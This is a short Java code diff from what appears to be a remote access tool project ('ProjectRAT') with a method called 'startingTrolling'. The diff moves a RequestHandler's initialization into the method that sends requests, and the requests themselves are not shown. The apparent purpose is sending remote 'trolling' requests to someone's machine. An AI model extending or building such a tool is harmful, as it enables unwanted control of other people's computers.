@@ -18,7 +18,7 @@ public class ProjectRAT {
             "main",
             "cool"
     );
-    public static RequestHandler requestHandler = new RequestHandler();
+    public static RequestHandler requestHandler;
 
     public static void main(String[] args) {
         startingTrolling();
@@ -28,6 +28,7 @@ public class ProjectRAT {
     public static void startingTrolling(){
         try {
             RequestManager manager = new RequestManager();
+            requestHandler = new RequestHandler();
             for (Request request : manager.getRequests()){
                 request.init();
                 requestHandler.sendRequest(request);
